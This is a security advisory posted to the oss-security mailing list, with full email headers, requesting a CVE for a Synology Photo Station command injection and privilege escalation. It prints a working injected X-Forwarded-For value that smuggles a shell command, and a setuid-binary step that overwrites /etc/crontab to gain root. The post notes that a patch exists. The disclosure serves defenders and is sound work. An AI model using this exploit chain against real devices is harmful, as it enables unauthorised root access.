X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2605" "Thursday" "28" "January" "2016" "06:31:46" "+0000" "lucas_leong@trend.com.tw" "lucas_leong@trend.com.tw" "<3AE6A5EB7FBC894F91BF6F1F3B80613B0121FFFCB8@adcexmbx03.tw.trendnet.org>" "82" "[oss-security] CVE request: Synology Photo Station command injection and privilege escalation" nil nil nil "1" "2016012806:31:46" "[oss-security] CVE request: Synology Photo Station command injection and privilege escalation" (number mark "U       lucas_leong@ Jan 28   82/2605  " thread-indent "\"[oss-security] CVE request: Synology Photo Station command injection and privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 29851 invoked by uid 550); 28 Jan 2016 06:44:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 6085 invoked from network); 28 Jan 2016 06:32:01 -0000
From: "lucas_leong@trend.com.tw" <lucas_leong@trend.com.tw>
To: "cve-assign@mitre.org" <cve-assign@mitre.org>
CC: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE request: Synology Photo Station command injection and
 privilege escalation
Thread-Index: AdFZlRMjB+9t3wMFTFSr2emTkwqMrQ==
Date: Thu, 28 Jan 2016 06:31:46 +0000
Message-ID: <3AE6A5EB7FBC894F91BF6F1F3B80613B0121FFFCB8@adcexmbx03.tw.trendnet.org>
Accept-Language: zh-TW, en-US
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-originating-ip: [10.1.168.43]
Content-Type: multipart/alternative;
	boundary="_000_3AE6A5EB7FBC894F91BF6F1F3B80613B0121FFFCB8adcexmbx03twt_"
MIME-Version: 1.0
X-TM-AS-MML: disable
X-TM-AS-Product-Ver: IMSVA-8.5.0.1165-8.0.0.1202-22094.004
X-TMASE-Version: IMSVA-8.5.0.1165-8.0.1202-22094.004
X-TMASE-Result: 10--64.456800-5.000000
X-TMASE-MatchedRID: 9grNSOyUwYtGwr/Jem62/wQ6EfMOwvTmLoYOuiLW+uX+4rSG/SVXCdGu
	loT4hVHXnpKzo7ZuKEbiqgF0P5FbUySFCS/w8sj5jWe5HOFKvuNMkOX0Uoduue9Gsl+X6QtTrEp
	swCJOq6Zh1F9W0o/kLI4S3q7uV6OhLaP72qTz0h7PfDU9TFrh7/i4nVERfgwdh8BhJvgqWBlh4r
	/wCPzhZBl6+XoZUTuCAH/xyJs7whhetYa57ZTjsTTR2TFg0xG3DYBVKmbeeQP5UUsWrwDyNSztb
	ucu05y3AQ7CvO4Bp3XAv+gQW0EfHayPTSrsLQN6OJTWdcuXC/5QCOsAlaxN78i9AjK6C8p1jWZJ
	blel2BnUqxn7ScGNN30FayZxhGYt/P+NVrYlIEPvVbHa5Rs8t/2xX1OVrWqLStFk/81wIJKLOsW
	lYdMG9wR1ZtMYefFWPC7j/mzpDFrd4xdn1XD3cwwfhKwa9GwDWq9ln3+CkiGlF7MF/8ayEjnuQW
	M5MjklgExzV+J9XRggT0hNg8hPWVy8LiE9LxheIj0zFI5DoJItUSMDHceMrpgjZJ0l7MH//hvZ0
	3pY0pMm7htOmBDa9DftF2CuSEfLDPIzF4wRfrAURSScn+QSXlsKO+9Zlb5J1B0Hk1Q1KyIzqx6D
	tfVZtgKmARN5PTKc
Subject: [oss-security] CVE request: Synology Photo Station command injection and privilege
 escalation

--_000_3AE6A5EB7FBC894F91BF6F1F3B80613B0121FFFCB8adcexmbx03twt_
Content-Type: text/plain;
	charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Title: Synology Photo Station command injection and privilege escalation
Vendor: Synology (https://www.synology.com/)
Product: Photo Station
Status: Patch released
Affected: version <=3D 6.3-2954
Impact: Any guest account can execute arbitrary command with root permission



Vulnerability 1: Command injection

The vulnerability is in appstore/PhotoStation/photo/login.php

118     if ($x_forward) {
119         $ip =3D $x_forward;
120     }
...
176     $commend =3D "/usr/syno/bin/synoautoblock --reset \"".$ip."\"";
177     @system($commend, $retval);

Since, the page did not filter X-Forwarded-For header and lead to command i=
njection
After sending a crafted header, a command is executed under http permission

X-Forwarded-For: ";id>/tmp/hack;"

> cat /tmp/hack
uid=3D1023(http) gid=3D1023(http) groups=3D1023(http)



Vulnerability 2: Privilege escalation

For the privilege escalation vulnerability, it is a simple setuid problem.

> ls -al /usr/syno/bin/synophoto_dsm_user
lrwxrwxrwx    1 root     root            56 Sep 16 22:53 /usr/syno/bin/syno=
photo_dsm_user -> /var/packages/PhotoStation/target/bin/synophoto_dsm_user
> ls -al /var/packages/PhotoStation/target/bin/synophoto_dsm_user
-rwsr-xr-x    1 root     root         30520 Jul  6 19:55 /var/packages/Phot=
oStation/target/bin/synophoto_dsm_user
> ls -al /tmp/hack2
-rw-rw-rw-    1 http     http            15 Sep 23 00:24 /tmp/hack2
> cat /tmp/hack2
pwned by lucas
> ls -al /etc/crontab
-rw-r--r--    1 root     root           404 Aug 27 13:25 /etc/crontab
> synophoto_dsm_user --copy-no-ea /tmp/hack2 /etc/crontab
> cat /etc/crontab
pwned by lucas

After overwritng crontab, arbitrary process can be executed with root permi=
ssion


Patch:
Vendor released the patch and the issue has solved in 6.3-2958
https://www.synology.com/en-us/releaseNote/PhotoStation

Timeline:
2015/09/23         Vendor Notified
2015/10/01         Patch Released



<table class=3D"TM_EMAIL_NOTICE"><tr><td><pre>
TREND MICRO EMAIL NOTICE
The information contained in this email and any attachments is confidential
and may be subject to copyright or other intellectual property protection.
If you are not the intended recipient, you are not authorized to use or
disclose this information, and we request that you notify us by reply mail =
or
telephone and delete the original message from your mail system.
</pre></td></tr></table>

--_000_3AE6A5EB7FBC894F91BF6F1F3B80613B0121FFFCB8adcexmbx03twt_--

